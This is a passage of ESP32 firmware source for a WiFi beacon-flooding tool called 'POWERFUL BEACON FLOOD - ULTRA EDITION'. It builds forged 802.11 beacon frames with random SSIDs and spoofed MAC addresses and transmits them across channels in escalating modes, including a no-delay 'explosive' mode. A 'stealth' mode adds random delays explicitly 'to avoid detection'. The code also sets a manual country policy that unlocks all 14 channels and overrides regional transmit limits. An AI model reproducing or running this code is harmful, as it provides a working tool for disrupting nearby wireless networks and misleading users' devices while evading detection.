      }
    }
    
    lastCheck = now;
  }
}

void updatePPS() {
  unsigned long now = millis();
  if (now - lastPPSUpdate >= 1000) {
    packets_per_second = packetsInSecond;
    packetsInSecond = 0;
    lastPPSUpdate = now;
    
    // Adjust transmission rate if exceeding max PPS
    if (packets_per_second > max_packets_per_second) {
      packet_interval_ms = minValue(packet_interval_ms + 1, 100);
    } else if (packets_per_second < max_packets_per_second / 2) {
      packet_interval_ms = maxValue(packet_interval_ms - 1, 1);
    }
  }
}

void sendMultiplePackets(uint8_t channel, int count) {
  if (count <= 0) return;
  
  for (int i = 0; i < count && beacon_active && !beacon_paused; i++) {
    int cacheSize = (int)ssidCache.size();
    int maxIndex = minValue((int)config.num_ssids, cacheSize);
    if (maxIndex <= 0) maxIndex = 1;
    
    int ssid_idx = random(0, maxIndex);
    
    char currentSSID[MAX_SSID_LENGTH + 1];
    getSSID(ssid_idx, currentSSID);
    
    uint8_t mac[6];
    generateRandomMAC(mac, ssid_idx);
    
    // Choose buffer for parallel transmission
    uint8_t* buffer = beaconPacket;
    if (config.enable_parallel_transmission) {
      switch (i % 5) {
        case 0: buffer = beaconPacket; break;
        case 1: buffer = beaconPacket2; break;
        case 2: buffer = beaconPacket3; break;
        case 3: buffer = beaconPacket4; break;
        case 4: buffer = beaconPacket5; break;
      }
    }
    
    int len = buildBeaconPacket(currentSSID, mac, channel, buffer);
    
    if (len > 0) {
      esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, buffer, len, false);
      totalPacketsSent++;
      packetsInSecond++;
      lastPacketTime = millis();
      
      if (res != ESP_OK) {
        errorCount++;
        if (errorCount % 50 == 0) {
          logError(res, "Packet transmission");
        }
      }
    }
    
    // Apply packet interval
    if (packet_interval_ms > 1) {
      delayMicroseconds(packet_interval_ms * 100);
    }
  }
}

void sendPacketBurst(uint8_t channel, int burst_size) {
  if (!packet_burst_enabled) {
    sendMultiplePackets(channel, burst_size);
    return;
  }
  
  // Prepare multiple packets first
  int packets_to_send = minValue(burst_size, 10);
  
  for (int i = 0; i < packets_to_send && beacon_active && !beacon_paused; i++) {
    int cacheSize = (int)ssidCache.size();
    int maxIndex = minValue((int)config.num_ssids, cacheSize);
    if (maxIndex <= 0) maxIndex = 1;
    
    int ssid_idx = random(0, maxIndex);
    
    char currentSSID[MAX_SSID_LENGTH + 1];
    getSSID(ssid_idx, currentSSID);
    
    uint8_t mac[6];
    generateRandomMAC(mac, ssid_idx);
    
    uint8_t* buffer = beaconPacket;
    if (i % 5 == 1) buffer = beaconPacket2;
    else if (i % 5 == 2) buffer = beaconPacket3;
    else if (i % 5 == 3) buffer = beaconPacket4;
    else if (i % 5 == 4) buffer = beaconPacket5;
    
    int len = buildBeaconPacket(currentSSID, mac, channel, buffer);
    
    // Send immediately
    if (len > 0) {
      esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, buffer, len, false);
      totalPacketsSent++;
      packetsInSecond++;
      
      if (res != ESP_OK) {
        errorCount++;
      }
    }
  }
}

void changeChannel() {
  switch (current_strategy) {
    case STRAT_HOPPING:
      currentChannelIndex = (currentChannelIndex + 1) % CHANNEL_COUNT;
      break;
      
    case STRAT_FOCUSED:
      // Stay on focus channel
      for (int i = 0; i < CHANNEL_COUNT; i++) {
        if (CHANNELS[i] == focus_channel) {
          currentChannelIndex = i;
          break;
        }
      }
      break;
      
    case STRAT_SWEEP:
      currentChannelIndex = (currentChannelIndex + 1) % CHANNEL_COUNT;
      break;
      
    case STRAT_RANDOM:
      currentChannelIndex = random(0, CHANNEL_COUNT);
      break;
  }
  
  uint8_t channel = CHANNELS[currentChannelIndex];
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  channelChanges++;
  lastChannelChange = millis();
  
  if (config.enable_performance_stats) {
    Serial.printf("[CHANNEL] Switched to channel %d\n", channel);
  }
}

void aggressiveTransmission() {
  unsigned long channelStart = millis();
  unsigned long dwellTime = getDwellTime();
  
  while (beacon_active && !beacon_paused && (millis() - channelStart < dwellTime)) {
    sendMultiplePackets(CHANNELS[currentChannelIndex], config.tx_per_channel * 3);
    
    // System maintenance
    if (totalPacketsSent % 100 == 0) {
      checkHeap();
      feedWatchdog();
      updatePPS();
    }
    
    // Small delay to prevent overwhelming
    delayMicroseconds(500);
  }
  
  // Change channel after dwell time
  if (millis() - channelStart >= dwellTime) {
    changeChannel();
  }
}

void turboTransmission() {
  // Maximum speed transmission
  unsigned long startTime = millis();
  unsigned long dwellTime = getDwellTime();
  
  while (beacon_active && !beacon_paused && (millis() - startTime < dwellTime)) {
    // Send burst of packets
    sendPacketBurst(CHANNELS[currentChannelIndex], config.tx_per_channel * 5);
    
    // Minimal delay
    delayMicroseconds(100);
    
    // Quick maintenance every 500 packets
    if (totalPacketsSent % 500 == 0) {
      feedWatchdog();
      updatePPS();
    }
  }
  
  // Fast channel change
  if (millis() - startTime >= dwellTime) {
    changeChannel();
    delay(1);
  }
}

void explosiveTransmission() {
  // Extreme mode - maximum packets with no delays
  unsigned long packetsSentThisCycle = 0;
  const unsigned long MAX_PACKETS_PER_CYCLE = 1000;
  
  while (beacon_active && !beacon_paused && packetsSentThisCycle < MAX_PACKETS_PER_CYCLE) {
    // Send as fast as possible
    for (int i = 0; i < 5; i++) {
      int cacheSize = (int)ssidCache.size();
      int maxIndex = minValue((int)config.num_ssids, cacheSize);
      if (maxIndex <= 0) maxIndex = 1;
      
      int ssid_idx = random(0, maxIndex);
      
      char currentSSID[MAX_SSID_LENGTH + 1];
      getSSID(ssid_idx, currentSSID);
      
      uint8_t mac[6];
      generateRandomMAC(mac, ssid_idx);
      
      uint8_t* buffers[] = {beaconPacket, beaconPacket2, beaconPacket3, beaconPacket4, beaconPacket5};
      int len = buildBeaconPacket(currentSSID, mac, CHANNELS[currentChannelIndex], buffers[i]);
      
      if (len > 0) {
        esp_wifi_80211_tx(WIFI_IF_AP, buffers[i], len, false);
        totalPacketsSent++;
        packetsInSecond++;
        packetsSentThisCycle++;
      }
    }
    
    // Emergency watchdog feed
    if (totalPacketsSent % 1000 == 0) {
      esp_task_wdt_reset();
    }
  }
  
  // Very fast channel hopping
  changeChannel();
}

void normalTransmission() {
  unsigned long channelStart = millis();
  unsigned long dwellTime = getDwellTime();
  
  int beaconsThisChannel = 0;
  int maxBeacons = minValue((int)config.num_ssids, 500);
  
  for (int i = 0; i < maxBeacons && beacon_active && !beacon_paused; i++) {
    if (millis() - channelStart > dwellTime) break;
    
    sendMultiplePackets(CHANNELS[currentChannelIndex], config.tx_per_channel);
    beaconsThisChannel += config.tx_per_channel;
    
    // System maintenance
    if (i % 50 == 0) {
      checkHeap();
      feedWatchdog();
      updatePPS();
    }
    
    // Standard delay
    delay(5);
  }
  
  // Change channel after processing
  if (beacon_active && !beacon_paused) {
    changeChannel();
    delay(10);
  }
}

void stealthTransmission() {
  unsigned long channelStart = millis();
  unsigned long dwellTime = getDwellTime() * 2;  // Longer dwell for stealth
  
  int beaconsThisChannel = 0;
  int maxBeacons = minValue((int)config.num_ssids, 200);
  
  for (int i = 0; i < maxBeacons && beacon_active && !beacon_paused; i++) {
    if (millis() - channelStart > dwellTime) break;
    
    sendMultiplePackets(CHANNELS[currentChannelIndex], 1);  // Only 1 packet per SSID
    
    // Random delays to avoid detection
    delay(random(10, 50));
    
    beaconsThisChannel++;
    
    // Minimal maintenance
    if (i % 100 == 0) {
      feedWatchdog();
    }
  }
  
  // Slow channel change
  if (beacon_active && !beacon_paused) {
    changeChannel();
    delay(100);
  }
}

void setWiFiSettings() {
  // Set TX power
  esp_wifi_set_max_tx_power(config.tx_power * 4);
  
  // Set bandwidth
  esp_wifi_set_bandwidth(WIFI_IF_AP, (wifi_bandwidth_t)config.channel_bandwidth);
  
  // Set country
  wifi_country_t country;
  memset(&country, 0, sizeof(country));
  strncpy(country.cc, COUNTRY_CODE, 2);
  country.cc[2] = 0;
  country.schan = 1;
  country.nchan = 14;
  country.max_tx_power = config.tx_power;
  country.policy = WIFI_COUNTRY_POLICY_MANUAL;
  esp_wifi_set_country(&country);
}

void initializeWiFi() {
  // Set CPU to maximum frequency
  setCpuFrequencyMhz(240);
  
  // Initialize WiFi with advanced settings
  WiFi.mode((wifi_mode_t)config.wifi_mode);
  
  // Configure AP settings
  wifi_config_t ap_config;
  memset(&ap_config, 0, sizeof(ap_config));
  
  strncpy((char*)ap_config.ap.ssid, "POWERFUL_BEACON_FLOOD", 32);
  ap_config.ap.ssid_len = strlen("POWERFUL_BEACON_FLOOD");
  ap_config.ap.channel = 1;
  ap_config.ap.authmode = WIFI_AUTH_OPEN;
  ap_config.ap.ssid_hidden = 1;
  ap_config.ap.max_connection = 1;
  ap_config.ap.beacon_interval = 60000;  // Very long beacon interval
  
  if (config.disable_wifi_mgmt) {
    ap_config.ap.beacon_interval = 60000;
  }
  
  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
  
  // Start WiFi
  esp_wifi_start();
  
  // Apply advanced settings
  setWiFiSettings();
}

void setupWatchdog() {
  // Initialize task watchdog
  esp_task_wdt_init(30, true);
  esp_task_wdt_add(NULL);
}

void handleModeChange() {
  switch (current_mode) {
    case MODE_NORMAL:
      config.tx_per_channel = 4;
      config.dwell_ms = 150;
      packet_interval_ms = 5;
      break;
      
    case MODE_AGGRESSIVE:
      config.tx_per_channel = 8;
      config.dwell_ms = 80;
      packet_interval_ms = 2;
      break;
      
    case MODE_STEALTH:
      config.tx_per_channel = 2;
      config.dwell_ms = 300;
      packet_interval_ms = 20;
      break;
      
    case MODE_TURBO:
      config.tx_per_channel = 15;
      config.dwell_ms = 30;
      packet_interval_ms = 1;
      break;
      
    case MODE_EXPLOSIVE:
      config.tx_per_channel = 25;
      config.dwell_ms = 10;
      packet_interval_ms = 0;
      break;
  }
}

void logError(esp_err_t error, const char* context) {
  Serial.printf("[ERROR] %s: %s (0x%04X)\n", context, esp_err_to_name(error), error);
}

// ---------- MAIN FUNCTIONS ----------
void beacon_setup() {
  Serial.println("\n════════════════════════════════════════════════");
  Serial.println("     POWERFUL BEACON FLOOD - ULTRA EDITION");
  Serial.println("════════════════════════════════════════════════");
  
  startTime = millis();
  randomSeed(esp_random());
  
  // Optimize system
  setupWatchdog();
  
  // Initialize WiFi with maximum performance
  initializeWiFi();
  
  // Generate SSID cache
  if (config.enable_ssid_cache) {
    generateSSIDCache();
  }
  
  // Set initial mode
  handleModeChange();
  
  beacon_active = true;
  beacon_paused = false;
  
  Serial.println("[SYSTEM] Initialization complete!");
  Serial.printf("[SYSTEM] Mode: %d, Channels: %d, SSIDs: %d\n", 
                current_mode, CHANNEL_COUNT, config.num_ssids);
  Serial.printf("[SYSTEM] TX Power: %ddBm, Dwell: %dms\n", 
                config.tx_power, config.dwell_ms);
  Serial.println("[SYSTEM] Starting in 1 second...");
  
  delay(1000);
}

void beacon_loop() {
  if (!beacon_active || beacon_paused) {
    delay(10);
    return;
  }
  
  // Select transmission mode
  switch (current_mode) {
    case MODE_NORMAL:
      normalTransmission();
      break;
      
    case MODE_AGGRESSIVE:
      aggressiveTransmission();
      break;
      
    case MODE_STEALTH:
      stealthTransmission();
      break;
      
    case MODE_TURBO:
      turboTransmission();
      break;
      
    case MODE_EXPLOSIVE:
      explosiveTransmission();
      break;
  }
  
  // Periodic statistics display
  static unsigned long lastStat = 0;
  unsigned long now = millis();
  if (now - lastStat > 5000 && config.enable_performance_stats) {
    printRealTimeStats();
    lastStat = now;
  }
  
  // System maintenance
  updatePPS();
  checkHeap();
}

void printRealTimeStats() {
  unsigned long runtime = millis() - startTime;
  float avgPPS = (runtime > 0) ? (totalPacketsSent * 1000.0 / runtime) : 0;
  
  Serial.printf("[STATS] PPS: %lu, Total: %lu, Errors: %lu, Chan: %d\n",
                packets_per_second, totalPacketsSent, errorCount, CHANNELS[currentChannelIndex]);
}

void stop_beacon() {
  beacon_active = false;
  beacon_paused = false;
  cleanupMemory();
  
  // Put WiFi to sleep
  WiFi.mode(WIFI_OFF);
  esp_wifi_stop();
  
  Serial.println("[SYSTEM] Beacon stopped - WiFi disabled");
}

void emergency_stop() {
  beacon_active = false;
  beacon_paused = false;
  
  // Immediate shutdown
  WiFi.mode(WIFI_OFF);
  esp_wifi_stop();
  esp_wifi_deinit();
  
  // Reset watchdog
  esp_task_wdt_init(30, true);
  
  Serial.println("[SYSTEM] EMERGENCY STOP - Complete shutdown");
}

void pause_beacon() {
  beacon_paused = true;
  Serial.println("[SYSTEM] Beacon paused");
}

void resume_beacon() {
  beacon_paused = false;
  Serial.println("[SYSTEM] Beacon resumed");
}

void cleanupMemory() {
  // Clear all buffers
  memset(beaconPacket, 0, BEACON_BUFFER_SIZE);
  memset(beaconPacket2, 0, BEACON_BUFFER_SIZE);
  memset(beaconPacket3, 0, BEACON_BUFFER_SIZE);
  memset(beaconPacket4, 0, BEACON_BUFFER_SIZE);
  memset(beaconPacket5, 0, BEACON_BUFFER_SIZE);
  
  // Clear caches if needed
  if (!config.enable_ssid_cache) {
    ssidCache.clear();
    vector<String>().swap(ssidCache);  // Force memory deallocation
    macCache.clear();
    vector<array<uint8_t, 6>>().swap(macCache);  // Force memory deallocation
  }
  
  // Force garbage collection
  heap_caps_malloc_extmem_enable(64);
  
  Serial.println("[MEMORY] Cleanup complete");
}

void feedWatchdog() {
  static unsigned long lastFeed = 0;
  unsigned long now = millis();
  if (now - lastFeed > 500) {
    esp_task_wdt_reset();
    lastFeed = now;
  }
}